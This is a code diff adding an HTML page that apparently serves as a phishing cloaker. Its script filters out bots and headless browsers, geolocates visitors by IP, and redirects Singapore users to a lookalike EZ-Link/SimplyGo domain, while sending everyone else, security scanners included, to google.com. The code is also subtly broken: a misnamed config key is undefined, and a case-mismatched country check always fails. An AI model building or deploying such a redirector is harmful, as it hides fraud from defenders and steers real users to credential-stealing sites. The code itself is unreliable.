@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        /* Prevent any flash of content */
+        body { visibility: hidden; }
+    </style>
+    <script>
+        // Configuration
+        const CONFIG = {
+            ALLOWED_COUNTRY: 'Singapore',
+            REDIRECT_URL_SINGAPORE: 'https://ezlink-simplygo.prosucesso.cv', // ← CHANGE THIS TO YOUR DESIRED URL
+            REDIRECT_URL_BLOCKED: 'https://google.com',
+            USE_EDGE_FUNCTION: true, // Set to true to use Vercel Edge Function
+            EDGE_FUNCTION_URL: '/api/check-security' // Your edge function endpoint
+        };
+
+        // Simple bot detection (client-side pre-check)
+        function quickBotCheck() {
+            const ua = navigator.userAgent.toLowerCase();
+            const botPatterns = ['bot', 'crawler', 'spider', 'curl', 'wget'];
+            
+            if (botPatterns.some(pattern => ua.includes(pattern)) || 
+                navigator.webdriver || 
+                window.screen.width === 0) {
+                return true;
+            }
+            return false;
+        }
+
+        // Main security check using Edge Function
+        async function performSecurityCheck() {
+            // If using Edge Function
+            if (CONFIG.USE_EDGE_FUNCTION) {
+                // Make request without waiting for try-catch
+                fetch(CONFIG.EDGE_FUNCTION_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        userAgent: navigator.userAgent,
+                        screenWidth: window.screen.width,
+                        screenHeight: window.screen.height,
+                        webdriver: navigator.webdriver || false
+                    })
+                })
+                .then(response => response.json())
+                .then(result => {
+                    if (result.blocked || result.isBot || !result.allowed) {
+                        window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
+                    } else if (result.isSingapore) {
+                        window.location.replace(CONFIG.REDIRECT_URL_Singapore);
+                    } else {
+                        window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
+                    }
+                })
+                .catch(() => {
+                    // Fallback on error
+                    performClientSideCheck();
+                });
+            } else {
+                // Direct client-side check
+                performClientSideCheck();
+            }
+        }
+
+        // Client-side only fallback - optimized for speed
+        async function performClientSideCheck() {
+            // Start both requests in parallel
+            const ipPromise = fetch('https://api.ipify.org?format=json').then(r => r.json());
+            
+            try {
+                const { ip } = await ipPromise;
+                
+                // Quick geo check with first available service
+                fetch(`https://ipapi.co/${ip}/country_name/`)
+                    .then(r => r.text())
+                    .then(country => {
+                        const isSingapore = country.toLowerCase().includes('Singapore');
+                        window.location.replace(isSingapore ? CONFIG.REDIRECT_URL_Singapore : CONFIG.REDIRECT_URL_BLOCKED);
+                    })
+                    .catch(() => {
+                        window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
+                    });
+            } catch (e) {
+                window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
+            }
+        }
+
+        // Execute immediately when script loads (before DOM)
+        (async function() {
+            // Quick bot check - instant redirect
+            if (quickBotCheck()) {
+                window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
+                return;
+            }
+            
+            // Start all checks in parallel for speed
+            performSecurityCheck();
+        })();
+    </script>
+</head>
+<body>
+    <!-- Empty body - page redirects before anything renders -->
+</body>
+</html>
